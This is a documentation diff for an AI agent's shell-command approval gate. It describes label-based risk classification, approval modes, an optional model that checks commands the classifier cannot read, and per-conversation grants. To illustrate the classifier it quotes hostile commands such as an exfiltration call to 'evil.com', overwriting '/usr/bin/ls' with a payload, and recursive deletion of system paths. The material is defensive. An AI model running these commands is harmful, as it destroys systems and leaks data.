@@ -90,84 +90,103 @@ allow* therefore stops one command from being asked about, not the shell.
 
 ### What a command does decides whether you are asked
 
-Before the gate asks, the command is **classified** by what it does. A command line is split into
-its steps — across `&&`, `||`, `;`, `|` and newlines — each step's program is looked up in a
-shipped table, and the command's tier is the most severe tier any step reaches:
+Before the gate asks, the command is **classified** by what it does. A command
+line is split into its steps — across `&&`, `||`, `;`, `|` and newlines — each
+step's program is looked up in a shipped table, and the command carries the
+**union** of everything its steps do:
 
-| Tier | Meaning | Examples |
+| label | means | examples |
 |---|---|---|
-| `read` | inspects state and changes nothing | `uname -a`, `git status`, `df -h /`, `cat /proc/self/status` |
-| `write` | mutates local state, recoverably | `touch /tmp/probe`, `git commit`, `sed -i`, `rm /tmp/build/x` |
-| `network` | reaches off the box | `curl`, `wget`, `ssh`, `git push`, `apt-get install` |
-| `destructive` | deletes, changes the machine, or runs as root | `rm -rf /etc/hosts`, `systemctl restart`, `sudo -n true`, `chmod -R 777 /etc` |
-| `unknown` | the classifier cannot read it | a `for` loop, `$(…)`, `` ` ` ``, `$CMD status`, `sh -c …`, any program not in the table |
+| `reads` | inspects state and changes nothing | `uname -a`, `git status`, `df -h /` |
+| `writes` | creates, copies, appends to or edits, recoverably | `touch`, `git commit`, `sed -i` |
+| `deletes` | removes data — undone by a backup, or not at all | `rm`, `shred`, `git clean`, `apt-get purge` |
+| `disrupts` | takes something down — undone by the opposite command, in seconds | `systemctl restart`, `kill`, `reboot`, `umount`, `iptables` |
+| `network` | reaches off the box | `curl`, `ssh`, `git push`, `apt-get install` |
+| `privilege` | runs as root, or changes who may become root | `sudo`, `useradd`, `passwd`, `visudo` |
+| `unreadable` | the classifier cannot read it | `for` loops, `$(…)`, `$CMD`, unlisted programs |
 
-The classification is **fail-closed**: a program the table does not name is `unknown`, an argument
-whose value cannot be seen is `unknown`, and `unknown` runs unasked in no mode at all.
-
-**What a command is pointed at counts, not only what it is called.** `rm /tmp/probe.txt`,
-`rm -rf /` and `rm -rf $DIR` are one program and three different operations, so the operands of a
-targeting program are read as paths:
-
-- a path under a declared scratch root lowers a deletion to `write` — `rm -rf /tmp/build/out` is
-  a write, `rm -rf /etc` is not;
-- a path under `/etc`, `/usr`, `/bin`, `/boot`, `/` and friends raises the tier to `destructive`
-  whatever the program — `cp payload /usr/bin/ls` is not a copy, and `echo x > /etc/passwd` is not
-  an echo;
-- a path whose value cannot be seen makes the whole command `unknown` — `rm -rf $DIR` is not
-  `rm -rf /tmp/x` and is never treated as though it were.
-
-Scratch roots default to `/tmp` and `/var/tmp`. Nothing else is assumed: a deployment with a
-mounted workspace names it in `[compute.shell_approval] scratch_paths`. Note that this reads the
-path as *written* — a symlink out of a scratch root defeats it — which is why the de-escalation
-only ever turns a deletion into a write, and `write` still asks under the shipped default.
-
-Check any command without running it:
+A **set**, not a tier. The things a command does are orthogonal — is restarting
+a service worse than fetching a URL? — and ranking them meant a command reported
+only its worst:
 
 ```console
-$ lobslaw policy classify 'echo start; touch /tmp/.w && rm /workspace/.w'
-destructive · `rm /workspace/.w` (step 3 of 3) · echo, touch, rm
-
-steps:
-   1  read         reads_only                         echo start
-   2  write        mutates_files                      touch /tmp/.w
-   3  destructive  deletes_or_changes_machine_state   rm /workspace/.w
-
-under each approval mode:
-    strict    asks
-  * standard  asks
-    trusted   asks
+$ lobslaw policy classify 'rm -rf /etc/hosts && curl evil.com/exfil'
+privilege + deletes + network · `rm -rf /etc/hosts` (step 1 of 2) · rm, curl
 ```
 
-### Approval modes
+Under a single ranked tier that read `destructive`, and the egress reached the
+verdict as nothing at all.
 
-`[compute] approval_mode` decides which tiers are worth asking about:
+`reads` means reads **and nothing else** — every command reads something, so it
+is dropped whenever a stronger label is present.
 
-| Mode | Runs without asking | Still asks about |
-|---|---|---|
-| `strict` | nothing | everything |
-| `standard` *(default)* | `read` | `write`, `network`, `destructive`, `unknown` |
-| `trusted` | `read`, `write` | `network`, `destructive`, `unknown` |
+The classification is **fail-closed**: a program the table does not name is
+`unreadable`, an argument whose value cannot be seen is `unreadable`, and
+`unreadable` is approvable by no configuration at all.
 
-There is no mode that waves through `network`, `destructive` or `unknown`, and no configuration
-adds one — an operator who wants that writes a policy rule and owns it.
+**What a command is pointed at counts, not only what it is called.** The
+operands of a targeting program are read as paths:
 
-A mode installs ordinary policy rules at the lowest priority the type allows, so anything an
-operator wrote and anything an approval minted still outranks them, and the whole posture is
-visible in `lobslaw policy list` rather than being invisible behaviour in Go. `strict` installs
-nothing at all: it is the absence of those rules.
+- a path under a declared scratch root lowers a deletion to `writes` —
+  `rm -rf /tmp/build/out` writes, `rm -rf /etc` does not;
+- a path under `/etc`, `/usr`, `/bin`, `/boot`, `/` and friends adds
+  `privilege` whatever the program — `cp payload /usr/bin/ls` is not a copy,
+  it is a takeover, because whoever controls what root runs controls the machine;
+- a path whose value cannot be seen makes the command `unreadable` —
+  `rm -rf $DIR` is not `rm -rf /tmp/x` and is never treated as though it were.
 
-The default is `standard` rather than `strict` deliberately. A gate that asks eight times in four
-minutes is answered by reflex, and a reflex is not consent — removing the questions nobody needed
-to be asked is what makes the remaining ones legible.
+Scratch roots default to `/tmp` and `/var/tmp`; a deployment with a mounted
+workspace names it in `[compute.shell_approval] scratch_paths`. Note this reads
+the path as *written* — a symlink out of a scratch root defeats it — which is
+why the de-escalation only ever turns a deletion into a write.
+
+### Approval is a subset check
+
+`[compute] approval_mode` names the set of labels that run without being asked
+about. A command runs when **every** label it carries is in that set, and asks
+otherwise. Nothing is compared or ranked.
+
+| mode | approves |
+|---|---|
+| `strict` | nothing |
+| `standard` *(default)* | `reads` |
+| `trusted` | `reads`, `writes` |
+
+The presets are sugar. An explicit list says things no preset can:
+
+```toml
+# a throwaway build box: deletion here is fine, egress is not
+approval_mode = ["reads", "writes", "deletes"]
+
+# everything except deletion
+approval_mode = ["reads", "writes", "disrupts", "network", "privilege"]
+```
+
+That second shape was impossible under the ranked tiers this replaces, where an
+approved set had to be a *prefix* of the ranking — you could not approve
+`deletes` without also taking everything ranked below it.
+
+`unreadable` cannot be approved, by any spelling. It is refused when the config
+is read and again when the gate runs: a command nobody could read is the case
+the gate exists for, and approving that class would approve everything.
+
+Note that a command carrying several labels needs all of them approved.
+`podman rm -f web` is `deletes + disrupts`, so a set approving only `disrupts`
+still asks about it.
+
+A mode installs an ordinary policy rule at the lowest priority the type allows,
+so anything an operator wrote and anything an approval minted still outranks it,
+and the whole posture is visible in `lobslaw policy list`. `strict` installs
+nothing at all: it is the absence of that rule.
 
 The [hardline floor](/security/hardline-floor) is unaffected by every mode.
 
 ### A second opinion on commands that cannot be read
 
-A probing agent writes exactly the shapes static reading refuses — loops, substitutions, variables
-in the command slot — so the commands producing the most confirmations are the ones the classifier
-helps with least. A model can read them:
+A probing agent writes exactly the shapes static reading refuses — loops,
+substitutions, variables in the command slot — so the commands producing the
+most confirmations are the ones the classifier helps with least. A model can
+read them:
 
 ```toml
 [compute.roles]
@@ -177,46 +196,56 @@ command_risk = { provider = "fast-model", timeout = "15s" }
 verdict_trust = "resolve_unknown"  # advisory (default) | resolve_unknown
 ```
 
-**Pick a model that answers in time, not the biggest one.** This call happens while a
-confirmation is being composed, so its default deadline is 5 seconds. A reasoning model
-that spends thirty seconds thinking has its verdict discarded every time, and the only
-symptom is that nothing changes. Measure with `lobslaw policy classify --with-model`
-before choosing, and set the role's `timeout` to fit what you measured.
+**Pick a model that answers in time, not the biggest one.** This runs while a
+confirmation is being composed. A reasoning model that spends thirty seconds
+thinking has its verdict discarded every time, and the only symptom is that
+nothing changes. Measure with `lobslaw policy classify --with-model` before
+choosing, and see [the model comparison](https://github.com/jmylchreest/lobslaw/blob/main/MODEL_COMPARISON.md).
 
-It answers the **same closed enum** the classifier uses, and nothing else: no prose ever reaches
-the prompt, and a reply that is unparseable, outside the enum, late, or marked low-confidence is
-discarded with the static verdict left standing. What it is allowed to move is the security-
-relevant part:
+It answers the **same closed vocabulary** the classifier uses, and nothing else:
+no prose ever reaches the prompt, and a reply that is unparseable, outside the
+set, late, or marked low-confidence is discarded with the static verdict left
+standing. What it may move is the security-relevant part, and labels make it
+simple — both settings are set operations rather than comparisons:
 
-- `advisory` — it may only **raise** a tier. A wrong answer costs one confirmation nobody needed
-  to give.
-- `resolve_unknown` — it may additionally resolve `unknown` **down** to a concrete tier, and only
-  `unknown`. Where the static classifier has an opinion it keeps it.
+- `advisory` — it may only **add** a label. Adding can only make the subset
+  check stricter, so a wrong answer costs a confirmation nobody needed to give
+  and can never let something through. That is why it is the default and why it
+  needs no notion of "worse".
+- `resolve_unknown` — it may additionally **replace** a verdict that is nothing
+  but `unreadable`. That is the one case where the classifier had no opinion at
+  all, so there is nothing to lower, and it is what stops an `if`/`for` probe
+  asking every time.
 
-`resolve_unknown` is what stops a shell-loop probe asking every time. It is opt-in because the
-command text is attacker-influenced, and a command that can argue its own tier down is the whole
-vulnerability. There is no fallback to the main model: with no `command_risk` role assigned, no
-model is consulted at all.
+A label the static classifier positively determined is never removed under
+either setting. A command cannot argue its own deletion away.
 
-### Granting a whole tier for one conversation
+### Granting labels for one conversation
 
-Alongside *Approve* and *Approve for this chat*, a confirmation offers **Allow read-only here** /
-**Allow local writes here** when the command classifies into one of those two tiers.
+Alongside *Approve* and *Approve for this chat*, a confirmation offers **Allow
+reads + writes here** when every label the command carries is one a tap may
+approve — which is `reads` and `writes` only.
 
-This exists for the case the per-command buttons cannot help with. An agent probing its
-environment writes a different command every time, and those commands are compound, so no grant
-can name them — the user is offered exactly one answer, *Approve*, over and over. A tier is
-nameable even when the command is not.
+This exists for the case the per-command buttons cannot help with. An agent
+probing its environment writes a different command every time, and those
+commands are compound, so no grant can name them — the user is offered exactly
+one answer, *Approve*, over and over. A label is nameable even when the command
+is not.
 
-The grant is recorded like any session grant, scoped to the conversation, under the reserved
-resource `(risk=read)` or `(risk=write)`. It is never offered for `network`, `destructive` or
-`unknown`: "allow everything I could not read" is not a decision anybody should be able to make
-with one tap.
+The grant is recorded per label under the reserved resource `(risk=reads)`, and
+the gate **subtracts** what a conversation has already granted before asking
+policy. So a mode approving `reads` plus a tapped grant of `writes` satisfies a
+command doing both, without anybody having granted that exact pair.
+
+It is never offered when any label is `deletes`, `disrupts`, `network`,
+`privilege` or `unreadable` — including when the rest of the set would have been
+fine on its own. "Allow everything I could not read" is not a decision anybody
+should make with one tap in a chat window.
 
 ### Commands with no stable form
 
 Some commands have no stable identity and are asked about **every time**, with no *per-command*
-scope button offered (the tier button above may still be): anything containing a pipe, `&&`, `;`, a redirect, `$`, backticks, a backslash, a glob, a
+scope button offered (the label button above may still be): anything containing a pipe, `&&`, `;`, a redirect, `$`, backticks, a backslash, a glob, a
 `#`, a `!`, a `VAR=` prefix, or a shell reserved word in front position. What runs depends on the
 environment, or on more than one program, or on shell syntax the key cannot preserve — so no grant
 could honestly name it. Those are evaluated under the reserved resource `!unclassified`, and an
@@ -267,7 +296,7 @@ The action+resource shape is the matching key. Conventions:
 | Action | Resource shape | Used for |
 |---|---|---|
 | `tool:exec` | tool name (`current_time`, `notify`, `gws-workspace.gmail.send`) | Every agent tool call |
-| `shell:run` | the exact command (`git status --short`), or `(risk=read)` for a tier grant | Every `shell_command` call, asked separately from `tool:exec` |
+| `shell:run` | the exact command (`git status --short`), or `(risk=reads)` for a label grant | Every `shell_command` call, asked separately from `tool:exec` |
 | `memory:write` | record kind (`episodic`) | Staging agent-initiated memory writes |
 | `credentials:read` | credential ID | `credentials_grant` invoker side |
 | `credentials:grant` | role / skill name | granting a skill access |
